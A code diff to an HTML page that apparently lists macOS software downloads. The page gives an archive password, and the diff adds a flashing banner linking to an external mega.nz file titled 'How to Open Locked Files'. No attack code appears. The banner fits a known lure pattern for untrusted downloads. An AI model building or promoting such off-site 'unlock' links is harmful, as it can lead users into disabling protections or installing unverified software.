@@ -118,6 +118,52 @@
   .no-results { text-align:center; padding:40px 20px; font-family:'Share Tech Mono',monospace; font-size:12px; color:#6a7a7a; letter-spacing:.1em; display:none; }
   .footer { font-family:'Share Tech Mono',monospace; font-size:9px; color:rgba(0,245,255,.4); letter-spacing:.2em; text-align:center; line-height:2; margin-top:40px; }
   @media(prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important}#glow-canvas,#particle-canvas,#markers-canvas{display:none!important}}
+
+  /* Prominent locked-files guide */
+  .locked-files-banner {
+    display:flex; align-items:center; justify-content:space-between; gap:16px;
+    width:100%; margin:0 0 24px; padding:17px 18px;
+    border:2px solid #ff3b63;
+    background:linear-gradient(110deg,rgba(255,45,149,.30),rgba(20,0,12,.92) 48%,rgba(0,245,255,.18));
+    color:#fff; text-decoration:none; position:relative; overflow:hidden;
+    box-shadow:0 0 18px rgba(255,45,149,.48),inset 0 0 22px rgba(255,45,149,.12);
+    transition:transform .2s,border-color .2s,box-shadow .2s;
+    animation:locked-files-pulse 2.2s ease-in-out infinite;
+  }
+  .locked-files-banner::before {
+    content:''; position:absolute; inset:0; transform:translateX(-115%);
+    background:linear-gradient(100deg,transparent,rgba(255,255,255,.24),transparent);
+    animation:locked-files-shine 3.4s ease-in-out infinite; pointer-events:none;
+  }
+  .locked-files-banner:hover,.locked-files-banner:focus-visible {
+    transform:translateY(-2px); border-color:#fff;
+    box-shadow:0 0 30px rgba(255,45,149,.72),0 0 18px rgba(0,245,255,.35);
+    outline:none;
+  }
+  .locked-files-copy { position:relative; z-index:1; }
+  .locked-files-kicker {
+    display:block; margin-bottom:4px; font-family:'Share Tech Mono',monospace;
+    font-size:10px; letter-spacing:.24em; color:#ff8fbd; text-transform:uppercase;
+  }
+  .locked-files-title {
+    display:block; font-size:clamp(18px,4.8vw,24px); font-weight:700;
+    letter-spacing:.08em; line-height:1.1; text-transform:uppercase;
+    text-shadow:0 0 12px rgba(255,45,149,.95),0 0 22px rgba(0,245,255,.35);
+  }
+  .locked-files-action {
+    position:relative; z-index:1; flex-shrink:0;
+    font-family:'Share Tech Mono',monospace; font-size:11px; letter-spacing:.12em;
+    color:var(--cyan); text-transform:uppercase; text-shadow:0 0 8px var(--cyan);
+  }
+  @keyframes locked-files-pulse {
+    0%,100% { border-color:#ff3b63; }
+    50% { border-color:#ff8fbd; box-shadow:0 0 27px rgba(255,45,149,.65),inset 0 0 22px rgba(255,45,149,.16); }
+  }
+  @keyframes locked-files-shine { 0%,48% { transform:translateX(-115%); } 72%,100% { transform:translateX(115%); } }
+  @media(max-width:520px) {
+    .locked-files-banner { align-items:flex-start; flex-direction:column; gap:9px; }
+  }
+
 </style>
 </head>
 <body>
@@ -144,7 +190,14 @@
     <div class="sub">// the mac stack &#8212; macos</div>
   </div>
 
-  <div class="notice">
+  <a class="locked-files-banner" href="https://mega.nz/file/oBkGFZjT#pDS14OEsr1E85ShaMuPoTDKmDAXH8ZefFjuzfJ_8Hv" target="_blank" rel="noopener" aria-label="Important: How to open locked files">
+  <span class="locked-files-copy">
+    <span class="locked-files-kicker">Important guide</span>
+    <span class="locked-files-title">Important: How to Open Locked Files</span>
+  </span>
+  <span class="locked-files-action">Open guide &#8594;</span>
+</a>
+<div class="notice">
     <div class="n-title">[ README // INSTRUCTIONS ]</div>
     <div class="n-body">
       These are MacOS <b>Softwares</b> most apps and versions have an availible tutorial. &#8212; it's handy for knowing which plugins are compatible with what. Archive password: <span class="pw">star</span>
